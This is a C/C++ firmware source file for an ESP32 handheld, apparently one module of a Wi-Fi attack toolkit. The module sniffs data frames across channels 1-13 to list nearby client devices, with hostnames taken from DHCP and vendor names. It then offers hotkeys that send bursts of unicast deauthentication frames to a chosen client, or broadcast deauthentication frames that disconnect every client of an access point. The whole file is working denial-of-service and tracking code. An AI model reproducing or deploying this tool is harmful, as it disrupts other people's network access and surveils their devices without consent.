/*
 * wifi_clients_all — global client hunter.
 *
 * Channel-hops 1-13 in promiscuous mode, sniffing every data frame.
 * Builds a table of (STA, BSSID) pairs with last-seen + RSSI + channel.
 * No pre-selection of an AP required.
 *
 * Hotkeys on selected client:
 *   D = deauth that one client only (unicast)
 *   X = broadcast deauth the whole AP this client is on
 *   L = lock to this client's channel (stop hopping)
 *   H = unlock / resume hopping
 */
#include "app.h"
#include "../theme.h"
#include "ui.h"
#include "input.h"
#include "radio.h"
#include "wifi_deauth_frame.h"
#include "ble_db.h"
#include "dhcp_cache.h"
#include <WiFi.h>
#include <esp_wifi.h>

#define MAX_ALL 64

struct acli_t {
    uint8_t  sta[6];
    uint8_t  bssid[6];
    int8_t   rssi;
    uint8_t  ch;
    uint32_t last_seen;
    uint32_t frames;
};

static acli_t s_all[MAX_ALL];
/* Guards the s_all[] table + s_all_n against the promiscuous RX callback
 * (WiFi task) racing the UI task's reads/deauth snapshots. */
static portMUX_TYPE s_all_mux = portMUX_INITIALIZER_UNLOCKED;
static volatile int      s_all_n  = 0;
static volatile uint8_t  s_all_ch = 1;
static volatile bool     s_running = false;
static volatile bool     s_locked  = false;
static volatile bool     s_hop_alive = false;

static int find_pair(const uint8_t *sta, const uint8_t *bssid)
{
    for (int i = 0; i < s_all_n; ++i) {
        if (memcmp(s_all[i].sta, sta, 6) == 0 &&
            memcmp(s_all[i].bssid, bssid, 6) == 0) return i;
    }
    return -1;
}

static void cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_DATA) return;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    const uint8_t *p = pkt->payload;
    if (pkt->rx_ctrl.sig_len < 24) return;

    /* Try to learn a hostname from DHCP on open networks — cheap: bails
     * fast if the frame isn't DHCP. */
    dhcp_try_parse_802_11(p, pkt->rx_ctrl.sig_len);

    uint8_t fc = p[1];
    uint8_t from_ds = (fc >> 1) & 1;
    uint8_t to_ds   = (fc)      & 1;

    const uint8_t *bssid, *sta;
    if (to_ds && !from_ds)      { bssid = p + 4;  sta = p + 10; }
    else if (from_ds && !to_ds) { bssid = p + 10; sta = p + 4;  }
    else return;

    /* Reject broadcast or multicast stations. */
    if (sta[0] & 0x01) return;
    if (!memcmp(sta, bssid, 6)) return;

    /* Data-race fix: the whole table lookup + add/evict + field update must
     * be atomic vs the UI task. Two hazards without the lock:
     *   1. increment-before-fill — publishing s_all_n via s_all_n++ before
     *      the sta/bssid are memcpy'd lets the UI read a half-written row.
     *   2. LRU evict overwrites a live row in place while the UI reads it.
     * Hold s_all_mux across the whole block; for a fresh slot, populate it
     * fully and publish s_all_n LAST. */
    portENTER_CRITICAL_ISR(&s_all_mux);
    int idx = find_pair(sta, bssid);
    if (idx < 0) {
        if (s_all_n >= MAX_ALL) {
            /* LRU evict: overwrite the oldest row in place (under lock). */
            int oldest = 0;
            for (int i = 1; i < s_all_n; ++i)
                if (s_all[i].last_seen < s_all[oldest].last_seen) oldest = i;
            idx = oldest;
            memcpy(s_all[idx].sta,   sta,   6);
            memcpy(s_all[idx].bssid, bssid, 6);
            s_all[idx].frames = 0;
        } else {
            /* Fresh slot: fill fully, THEN publish the count. */
            idx = s_all_n;
            memcpy(s_all[idx].sta,   sta,   6);
            memcpy(s_all[idx].bssid, bssid, 6);
            s_all[idx].frames = 0;
            s_all[idx].rssi = pkt->rx_ctrl.rssi;
            s_all[idx].ch   = s_all_ch;
            s_all[idx].last_seen = millis();
            s_all[idx].frames++;
            s_all_n = idx + 1;
            portEXIT_CRITICAL_ISR(&s_all_mux);
            return;
        }
    }
    s_all[idx].rssi = pkt->rx_ctrl.rssi;
    s_all[idx].ch   = s_all_ch;
    s_all[idx].last_seen = millis();
    s_all[idx].frames++;
    portEXIT_CRITICAL_ISR(&s_all_mux);
}

static void hop_task(void *)
{
    s_hop_alive = true;
    while (s_running) {
        /* POS-AUDIT-211 / wifi-024: re-check s_locked immediately
         * before the set_channel syscall to close the small race
         * window between the decision and the issue. The outer
         * 200/400 ms cadence still allows a fresh burst to start
         * after the decision but before the hop fires; the second
         * check catches that case and skips the hop, which is the
         * cheapest defense short of a full mutex+state-machine
         * rewrite (deferred to Phase 2 / wifi-024 follow-up). */
        if (!s_locked) {
            uint8_t next_ch = (s_all_ch % 13) + 1;
            if (!s_locked) {
                s_all_ch = next_ch;
                esp_wifi_set_channel(s_all_ch, WIFI_SECOND_CHAN_NONE);
            }
        }
        delay(s_locked ? 200 : 400);
    }
    s_hop_alive = false;
    vTaskDelete(nullptr);
}

static uint16_t s_hot_seq = 0;

/* wifi_silent_ap_end() tears WiFi back to STA with promiscuous=false,
 * so the callback dies after a deauth. Re-arm before returning. */
static void restore_promisc(uint8_t ch)
{
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(cb);
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
}

static void unicast_deauth(const uint8_t *sta, const uint8_t *bssid, uint8_t ch, int bursts)
{
    if (s_hot_seq == 0) s_hot_seq = (uint16_t)(esp_random() & 0x0FFF);
    bool prev_lock = s_locked;
    s_locked = true;
    wifi_silent_ap_begin(ch);
    for (int i = 0; i < bursts; ++i) {
        wifi_deauth_pair(sta, bssid, &s_hot_seq);
        delay(5);
    }
    wifi_silent_ap_end();
    restore_promisc(ch);
    s_locked = prev_lock;
}

static void broadcast_deauth(const uint8_t *bssid, uint8_t ch, int bursts)
{
    if (s_hot_seq == 0) s_hot_seq = (uint16_t)(esp_random() & 0x0FFF);
    bool prev_lock = s_locked;
    s_locked = true;
    wifi_silent_ap_begin(ch);
    for (int i = 0; i < bursts; ++i) {
        wifi_deauth_broadcast(bssid, &s_hot_seq);
        delay(5);
    }
    wifi_silent_ap_end();
    restore_promisc(ch);
    s_locked = prev_lock;
}

/* Paint one client-pair row in full: its own full-width background (so the
 * prior row is overwritten without a body clear) then all columns on top.
 * Shared by the scroll-window and cursor-move redraw paths. */
static void draw_all_row(int r, int first, int cursor)
{
    auto &d = M5Cardputer.Display;
    const acli_t &c = s_all[first + r];
    int y = BODY_Y + 18 + r * 10;
    bool sel = (first + r == cursor);
    uint16_t bg = sel ? 0x18C7 : T_BG;
    d.fillRect(0, y - 1, SCR_W, 10, bg);

    uint32_t oui = ((uint32_t)c.sta[0] << 16) |
                   ((uint32_t)c.sta[1] << 8)  |
                    (uint32_t)c.sta[2];
    const char *vendor   = ble_db_oui(oui);
    const char *hostname = dhcp_hostname(c.sta);

    /* Left column: hostname wins over vendor (more specific). */
    if (hostname) {
        d.setTextColor(sel ? T_ACCENT : T_GOOD, bg);
        d.setCursor(2, y); d.printf("%-14.14s", hostname);
    } else if (vendor) {
        d.setTextColor(sel ? T_ACCENT : T_WARN, bg);
        d.setCursor(2, y); d.printf("%-14.14s", vendor);
    } else {
        d.setTextColor(T_DIM, bg);
        d.setCursor(2, y); d.printf("?");
    }
    d.setTextColor(sel ? T_ACCENT : T_FG, bg);
    d.setCursor(88, y);
    d.printf("%02X:%02X", c.sta[4], c.sta[5]);
    d.setTextColor(T_DIM, bg);
    d.setCursor(116, y);
    d.printf("→%02X:%02X", c.bssid[4], c.bssid[5]);
    d.setCursor(154, y); d.printf("ch%u", c.ch);
    d.setTextColor(sel ? T_ACCENT : T_FG, bg);
    d.setCursor(184, y); d.printf("%4d", c.rssi);
}

void feat_wifi_clients_all(void)
{
    radio_switch(RADIO_WIFI);
    wifi_lean_sta_init();

    s_all_n = 0;
    s_all_ch = 1;
    s_locked = false;
    s_running = true;

    /* Explicit MASK_ALL — capture silently dies on IDF 5.5 without it. */
    static const wifi_promiscuous_filter_t s_all_filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_ALL
    };
    esp_wifi_set_promiscuous_filter(&s_all_filter);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(cb);
    esp_wifi_set_channel(s_all_ch, WIFI_SECOND_CHAN_NONE);

    xTaskCreate(hop_task, "cli_hop", 3072, nullptr, 4, nullptr);

    int cursor = 0;
    ui_draw_footer(";/.=move D=dth X=apkill L=lock H=hop `=back");

    /* Static chrome painted once; the body never gets a blanket clear
     * after this, so scrolling no longer flashes black. The header line
     * (volatile channel/LOCK) is overwritten in place via ui_text_w. */
    {
        auto &d = M5Cardputer.Display;
        ui_force_clear_body();
        d.drawFastHLine(4, BODY_Y + 12, SCR_W - 8, T_ACCENT);
    }

    uint32_t last = 0;
    int last_count  = -1;
    int last_cursor = -1;
    int last_first  = -1;
    while (true) {
        const int rows = 8;
        int first = 0;
        if (s_all_n > 0) {
            if (cursor < 0) cursor = 0;
            if (cursor >= s_all_n) cursor = s_all_n - 1;
            first = cursor - rows / 2;
            if (first < 0) first = 0;
            if (first + rows > s_all_n) first = max(0, s_all_n - rows);
        }
        bool count_changed  = (s_all_n != last_count);
        bool cursor_changed = (cursor != last_cursor);
        bool first_changed  = (first != last_first);

        auto &d = M5Cardputer.Display;

        if (cursor_changed && !first_changed && !count_changed &&
            s_all_n > 0 && last_cursor >= 0) {
            /* Cursor moved within the window — 2 rows, immediate (responsive). */
            int old_r = last_cursor - first;
            int new_r = cursor - first;
            if (old_r >= 0 && old_r < rows && last_first + old_r < s_all_n)
                draw_all_row(old_r, first, cursor);
            if (new_r >= 0 && new_r < rows && first + new_r < s_all_n)
                draw_all_row(new_r, first, cursor);
            last_cursor = cursor;
        } else if (first_changed) {
            /* Scrolled to a new window — repaint it once, immediately. */
            last = millis();
            ui_text_w(4, BODY_Y + 2, SCR_W - 8, T_ACCENT,
                      "CLIENTS  %d  ch%u%s", s_all_n, s_all_ch,
                      s_locked ? " LOCK" : "");
            if (s_all_n == 0) {
                if (last_count != 0) {
                    d.fillRect(0, BODY_Y + 18, SCR_W, BODY_H - 18, T_BG);
                    d.setTextColor(T_DIM, T_BG);
                    d.setCursor(4, BODY_Y + 24); d.print("hopping all channels");
                    d.setCursor(4, BODY_Y + 36); d.print("waiting for data frames...");
                }
            } else {
                for (int r = 0; r < rows && first + r < s_all_n; ++r)
                    draw_all_row(r, first, cursor);
            }
            last_count = s_all_n; last_cursor = cursor; last_first = first;
            ui_draw_status(radio_name(), s_locked ? "lock" : "hunt");
        } else if (millis() - last >= 250) {
            /* Populate + live-RSSI, throttled to 4 Hz. A burst of newly
             * captured clients used to repaint the whole list on every
             * single arrival (tens of Hz) and strobed — the cap fixes it. */
            last = millis();
            ui_text_w(4, BODY_Y + 2, SCR_W - 8, T_ACCENT,
                      "CLIENTS  %d  ch%u%s", s_all_n, s_all_ch,
                      s_locked ? " LOCK" : "");
            if (s_all_n == 0) {
                if (last_count != 0) {
                    d.fillRect(0, BODY_Y + 18, SCR_W, BODY_H - 18, T_BG);
                    d.setTextColor(T_DIM, T_BG);
                    d.setCursor(4, BODY_Y + 24); d.print("hopping all channels");
                    d.setCursor(4, BODY_Y + 36); d.print("waiting for data frames...");
                }
            } else if (count_changed) {
                for (int r = 0; r < rows && first + r < s_all_n; ++r)
                    draw_all_row(r, first, cursor);
            } else {
                /* List unchanged — refresh only the volatile RSSI column. */
                for (int r = 0; r < rows && first + r < s_all_n; ++r) {
                    const acli_t &c = s_all[first + r];
                    int y = BODY_Y + 18 + r * 10;
                    bool sel = (first + r == cursor);
                    uint16_t bg = sel ? 0x18C7 : T_BG;
                    d.fillRect(184, y, SCR_W - 184, 10, bg);
                    d.setTextColor(sel ? T_ACCENT : T_FG, bg);
                    d.setCursor(184, y); d.printf("%4d", c.rssi);
                }
            }
            last_count = s_all_n; last_cursor = cursor; last_first = first;
            ui_draw_status(radio_name(), s_locked ? "lock" : "hunt");
        }

        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC) break;
        if (k == ';' || k == PK_UP)   { if (cursor > 0) cursor--; }
        if (k == '.' || k == PK_DOWN) { if (cursor + 1 < s_all_n) cursor++; }
        if (s_all_n == 0) continue;

        /* Data-race fix: copy the selected row into a local BEFORE any
         * deauth burst so a concurrent LRU evict on the RX task can't
         * mutate the target (sta/bssid/ch) mid-burst. Snapshot under lock. */
        acli_t sel;
        portENTER_CRITICAL(&s_all_mux);
        sel = s_all[cursor];
        portEXIT_CRITICAL(&s_all_mux);
        if (k == 'd' || k == 'D') {
            unicast_deauth(sel.sta, sel.bssid, sel.ch, 30);
            ui_toast("deauth → STA", T_BAD, 500);
        } else if (k == 'x' || k == 'X') {
            broadcast_deauth(sel.bssid, sel.ch, 30);
            ui_toast("deauth AP all", T_BAD, 500);
        } else if (k == 'l' || k == 'L') {
            s_locked = true;
            s_all_ch = sel.ch;
            esp_wifi_set_channel(s_all_ch, WIFI_SECOND_CHAN_NONE);
            ui_toast("locked", T_WARN, 400);
        } else if (k == 'h' || k == 'H') {
            s_locked = false;
            ui_toast("hopping", T_GOOD, 400);
        }
        /* Any of the above toasts painted over the body — force a full row
         * repaint next iteration to wipe the residue. */
        if (k == 'd' || k == 'D' || k == 'x' || k == 'X' ||
            k == 'l' || k == 'L' || k == 'h' || k == 'H')
            last_count = last_cursor = last_first = -1;
    }

    s_running = false;
    /* Join the hop task before returning — its loop period (200/400ms) is
     * longer than the old delay(150), so it could still be issuing
     * esp_wifi_set_channel when the next feature inits the radio. */
    uint32_t deadline = millis() + 800;
    while (s_hop_alive && millis() < deadline) delay(5);
    esp_wifi_set_promiscuous(false);
    delay(150);
}
